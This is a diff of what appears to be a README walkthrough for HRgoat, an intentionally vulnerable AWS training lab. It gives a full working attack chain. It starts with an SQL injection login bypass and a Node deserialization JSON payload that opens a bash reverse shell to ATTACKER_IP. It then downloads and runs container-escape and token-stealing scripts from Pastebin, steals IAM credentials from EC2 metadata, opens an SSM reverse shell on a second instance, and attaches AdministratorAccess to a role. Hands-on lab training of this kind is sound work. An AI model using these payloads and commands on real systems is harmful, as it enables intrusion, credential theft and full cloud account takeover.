@@ -67,109 +67,115 @@ Once upon a time, in a land of misconfigured cloud environments, a daring securi
 ---
 
 ## 🎬 Step 1: The Gate is Wide Open (SQL Injection)
-![image](https://github.com/user-attachments/assets/3519076c-3c8c-4cea-96d9-bbb33c331fe6)
+<img width="920" height="776" alt="image" src="https://github.com/user-attachments/assets/cede484f-1985-4043-a39a-2025eec6c66c" />
 
 Our journey starts at a login screen. With a bit of old-school magic, we bypass authentication using:
 ```sql
-' or '1'='1
+' or '1'='1' -- # Make sure to have space after the dashes
 ```
 
-Boom! We're in. But this is just the beginning...
+Achievement unlocked! 🎮 Admin powers activated - let the real adventure begin!
 
 ---
 
 ## 🎭 Step 2: Exploiting Insecure Deserialization
 
-To take it a step further, we leverage an insecure deserialization vulnerability. First, ensure you have a machine ready to receive a reverse shell:
+Time to level up with a legendary combo move! We're about to execute the 'Insecure Deserialization Exploit' - a boss-level technique that requires precise timing.
+First things first, adventurer - make sure your command center (reverse shell listener) is powered up and ready to catch the incoming connection. Think of it as setting up your base camp before the final raid!
+
+ Set up your listener on the remote machine to catch the incoming connection:
 ```bash
 nc -lvnp 4444
 ```
-![image](https://github.com/user-attachments/assets/d346b289-b820-41ac-9d6e-d36fa1938085)
+<img width="625" height="237" alt="image" src="https://github.com/user-attachments/assets/3ce8b72e-9bb3-4d03-95c9-b1b721cecd25" />
+
+While that's running, grab the NAT address of the machine - you'll need it for the next phase of the challenge.
 
 Navigate to System Tools and then Bulk Employee Upload
 
-![image](https://github.com/user-attachments/assets/68dfbb66-245f-45dc-9e70-71ad58afc431)
+<img width="1965" height="1009" alt="image" src="https://github.com/user-attachments/assets/f4747571-23d6-46ea-8c4f-9c5840d09a2d" />
 
-Modify `rce_exploit.json` found in the `examples` folder, setting your remote IP and port. Then, execute the exploit payload.
+
+Access the `examples/rce_exploit.json` file, update the `ATTACKER_IP` field with your listener’s IP address and the `REMOTE_PORT` field with the port you’ve configured, then insert the modified JSON into the Bulk Employee Upload function. After applying these changes, trigger the exploit payload to ensure the traffic is directed to your listener.
+
+```JSON
+{
+  "name": "Stealthy User",
+  "position": "Finance",
+  "department": "HQ",
+  "email": "whoami2@HRgoat.com",
+  "phone": "555-000-0000",
+  "location": "Remote",
+  "hire_date": "2023-01-01",
+  "status": "active",
+  "manager": "None",
+  "salary": 0,
+  "bio": "This is a non-blocking test.",
+  "metadata": "{\"rce\":\"_$$ND_FUNC$$_function(){const { spawn } = require('child_process'); const shell = spawn('/bin/bash', ['-c', '/bin/bash -i > /dev/tcp/ATTACKER_IP/REMOTE_PORT 0<&1 2>&1'], { detached: true, stdio: 'ignore' }); shell.unref(); return 'shell spawned and detached';}()\"}"
+}
+```
 
 ---
 
 ## 🚀 Step 3: Inside the Container!
 
 We’ve successfully landed in the container. 
-![image](https://github.com/user-attachments/assets/52b12748-7744-4f91-b115-8d306e12d386)
+<img width="858" height="244" alt="image" src="https://github.com/user-attachments/assets/eba78865-cc42-4d41-9f5e-9e7a50111bce" />
 
 
-But now, let’s check if we can escape:
-```bash
-grep CapEff /proc/self/status
-```
-![image](https://github.com/user-attachments/assets/a6e91fd6-c4af-4eb0-98fb-218b3a618120)
-
-If we see certain privilege bits set, it's time to break free! 🔓
 
 ---
 
 ## 🛠️ Step 4: Breaking Out of the Container
 
-Let's grab and execute the escape script, make sure to create new listener and change the IP and port number that within the script. 
-First navigate to the `examples` directory and find the script `container_escape_shell.sh`. Then, upload the script to PasteBin.com 
-Not Before you're changing the ATTACKER_IP and the REMOTE_IP parameters that within the script. 
+Your next step is to pull and execute a script crafted to capture the host token while slipping past the container boundary. Navigate to the examples directory and locate export_token.sh. 
+Once found, upload it to Pastebin or a similar service so you can easily fetch it back onto the target machine for execution.
 
-To use this script you need to create a new listener (you can create it on the same machine like before, just with different port,
-for example: `nc -nlvp 4445` The port before was 4444
 ```bash
 cd /tmp
 
-wget -O escape.sh https://pastebin.com/raw/[your uploaded URL]
-// for example - wget -O escape.sh https://pastebin.com/raw/YSbnzY2r
-sed -i 's/\r$//' escape.sh
-chmod +x escape.sh
-./escape.sh
+wget -O get_token.sh https://pastebin.com/raw/[your uploaded URL]   // for example - wget -O get_token.sh https://pastebin.com/raw/r3P5TVit
+sed -i 's/\r$//' get_token.sh
+chmod +x get_token.sh
+./get_token.sh
 ```
-![image](https://github.com/user-attachments/assets/b90a0976-0cdc-4b7a-8d4a-d82fa000f92e)
+<img width="1060" height="1126" alt="image" src="https://github.com/user-attachments/assets/c4a8688e-968d-4680-b5fe-fb800063d9df" />
 
-We are now inside the EC2 instance. 
-
+Now we got the tokens
 
 ---
 
-## 🔑 Step 5: Querying the IMDS for AWS Credentials
+## 🔑 Step 5: Container Escape and Host IAM Credential Extraction
 
-Let’s try to obtain a metadata token:
+This script is designed as a** container escape and AWS credential extraction tool**. Its main purpose is to bypass the container’s network isolation, reach the EC2 Instance Metadata Service (IMDS), and retrieve temporary IAM credentials from the host instance. 
+It does this by using nsenter to jump from the container network namespace into the host’s network namespace, then performing a series of steps to request an IMDSv2 token, identify the IAM role, and extract the associated credentials. The script includes logging, optional debug output, and parsing of the credentials into environment variables so they can be used immediately for AWS API access.
+
+Once the script completes successfully, the attacker will have the AWS AccessKeyId, SecretAccessKey, and SessionToken for the target instance.
+
+**Next steps for the attacker (these commands must be executed from the local terminal, not on the remote host):**
+Export the retrieved credentials as environment variables in your **local terminal**:
+
 ```bash
-TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+export AWS_ACCESS_KEY_ID="..."
+export AWS_SECRET_ACCESS_KEY="..."
+export AWS_SESSION_TOKEN="..."
 ```
-![image](https://github.com/user-attachments/assets/5aa90b82-5f83-4e76-9e79-4b660fdd027d)
+<img width="1737" height="1259" alt="image" src="https://github.com/user-attachments/assets/5f68ff2a-f6a5-4cd4-8e42-5f77540aa40f" />
 
-Success! Now let’s fetch security credentials:
-```bash
-ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
-```
-![image](https://github.com/user-attachments/assets/0068eb1c-f521-4012-9337-b19dd1034a01)
+<img width="1534" height="342" alt="image" src="https://github.com/user-attachments/assets/e27d6875-146f-42ce-b51e-7c308c1e1c1b" />
 
-Looks like we have `hrgoat-ssm-role`. Let's extract its credentials:
-```bash
-curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
-```
-![image](https://github.com/user-attachments/assets/0f257ddf-90a1-43d0-aa2e-85605d2c57bf)
-
-And there it is—Access Key ID, Secret Access Key, and Session Token! 🔥
 
 ---
 
 ## 🏠 Step 6: Using EC2 Credentials Locally
 
 Now, let’s shift operations to our local machine:
-```bash
-export AWS_ACCESS_KEY_ID=<VALUE>
-export AWS_SECRET_ACCESS_KEY=<VALUE>
-export AWS_SESSION_TOKEN=<VALUE>
-```
-Verify with:
+
 ```bash
 aws sts get-caller-identity
 ```
+<img width="1227" height="174" alt="image" src="https://github.com/user-attachments/assets/a2cf0c25-b17f-46f0-9d67-2da9dd7217b5" />
+
 ![image](https://github.com/user-attachments/assets/37bd2d45-44a5-414f-98ce-0d501f4d1fc7)
 
 We have AWS credentials. Time to enumerate our permissions!
@@ -178,8 +184,17 @@ We have AWS credentials. Time to enumerate our permissions!
 
 ## 🔍 Step 7: Mapping Out AWS Permissions
 
-Run `check_aws_permissions.sh` from the `examples` folder to identify what actions we can perform.
-![image](https://github.com/user-attachments/assets/261c268c-e198-49eb-9d7d-935a7dc2b2fe)
+Run `aws-perm-check.sh` from the `examples` folder to identify what actions we can perform (execute it from a local machine that has the user context where you've exported the credentials to).
+```bash
+cd /tmp
+
+wget -O aws-perm-check.sh https://pastebin.com/raw/[your uploaded URL]   // for example - wget -O aws-perm-check.sh https://pastebin.com/raw/jqZ9Kx6Z
+sed -i 's/\r$//' aws-perm-check.sh
+chmod +x aws-perm-check.sh
+./aws-perm-check.sh
+```
+
+<img width="1677" height="1127" alt="image" src="https://github.com/user-attachments/assets/603128d4-ca7b-4a5d-a8ec-668f0cba9726" />
 
 
 We find permissions allowing us to list EC2 instances and send SSM commands. Perfect for lateral movement!
@@ -188,17 +203,25 @@ We find permissions allowing us to list EC2 instances and send SSM commands. Per
 
 ## 📡 Step 8: Moving Laterally with SSM
 
-Let’s list EC2 instances:
+To get an overview of your EC2 instances, you can run:
 ```bash
-aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId, Tags[?Key==`Name`].Value|[0], State.Name]' --output table
+aws ec2 describe-instances --filters "Name=instance-state-name,Values=running" --query 'Reservations[*].Instances[*].[InstanceId, Tags[?Key==`Name`].Value|[0], State.Name]' --output table
 ```
-![image](https://github.com/user-attachments/assets/f90a2073-464d-4aba-a12e-bc7c90257fdf)
+<img width="1752" height="282" alt="image" src="https://github.com/user-attachments/assets/8de49a9e-6dc3-46fc-bbe5-074a9fae1b87" />
 
-Found one that looks interesting. Let’s gain access (create new listener, with another port):
+If your environment uses a region other than us-east-1, you can enumerate all EC2 instances across every region using the script at `examples\check_aws_instances.sh`.
+<img width="1404" height="996" alt="image" src="https://github.com/user-attachments/assets/d7a602d6-ac9b-4aab-bd69-6ebf0a1cbeb7" />
+
+
+Once you identify an instance of interest, the next step is to gain access. You can either open a new listener on a different port or reuse a previous one. 
+The goal is to connect to a different machine (Jenkins machine) than your current session, allowing you to explore other IAM roles for potential privilege escalation.
+
+From your local terminal, run the following command, making sure to update the instance ID, REMOTE_IP, and REMOTE_PORT
+
 ```bash
-aws ssm send-command --document-name "AWS-RunShellScript" --targets "Key=instanceIds,Values=i-0d76444a40c11c1bf" --parameters "commands=['bash -i >& /dev/tcp/REMOTE_IP/REMOTE_PORT 0>&1']" --region us-east-1
+aws ssm send-command --document-name "AWS-RunShellScript" --targets "Key=instanceIds,Values=i-0ef5488e604d5bd79" --parameters 'commands=["bash -c '\''bash -i >& /dev/tcp/REMOTE_IP/REMOTE_PORT 0>&1'\''"]' --region us-east-1
 ```
-![image](https://github.com/user-attachments/assets/162a99c3-0810-4a43-9baf-a2342491c6f5)
+<img width="1024" height="244" alt="image" src="https://github.com/user-attachments/assets/95c0b508-554e-4d64-a91f-269cf4486e19" />
 
 Now we have a shell on a second machine. Time to escalate further!
 
@@ -208,26 +231,31 @@ Now we have a shell on a second machine. Time to escalate further!
 
 From the new EC2 instance, repeat the credential extraction process:
 ```bash
-TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
-ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
-curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
-```
-![image](https://github.com/user-attachments/assets/b0f2e89b-5297-4530-802b-ad7765f8f247)
+#!/bin/bash
 
-Fetch roles and credentials, and analyze the permissions.
-![image](https://github.com/user-attachments/assets/6f228930-93e1-4cd3-926b-d3903ab99ad7)
+TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)
+
+echo "$CREDS" | jq -r '. | "export AWS_ACCESS_KEY_ID=\(.AccessKeyId)\nexport AWS_SECRET_ACCESS_KEY=\(.SecretAccessKey)\nexport AWS_SESSION_TOKEN=\(.Token)"'
+
+```
+<img width="1184" height="596" alt="image" src="https://github.com/user-attachments/assets/682bda11-3eed-4efc-9911-6cf5e373541a" />
+
+Fetch roles and credentials, and analyze the permissions with the previous script.
+<img width="1706" height="794" alt="image" src="https://github.com/user-attachments/assets/edd9c51e-f342-4a34-87a0-37e43caf14fa" />
 
 ---
 
 ## 🎯 Step 10: Escalating to Administrator
 
 We find that `hrgoat-jenkins-role` has IAM modification permissions. 
-![image](https://github.com/user-attachments/assets/4feefa82-0f32-4d2f-8863-8161da3eeb06)
+<img width="1706" height="794" alt="image" src="https://github.com/user-attachments/assets/32cf8865-a1d5-4ea9-8ed1-6202bc1da743" />
 
 
-Let’s exploit it:
+Let’s exploit it, make sure to use the appropriate region:
 ```bash
-aws iam attach-role-policy --role-name hrgoat-jenkins-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+aws iam attach-role-policy --role-name 'hrgoat-jenkins-role-us-east-1' --policy-arn 'arn:aws:iam::aws:policy/AdministratorAccess'
 ```
 ![image](https://github.com/user-attachments/assets/a7a8846e-78ee-4e7f-84c8-f791b4aa5797)
 
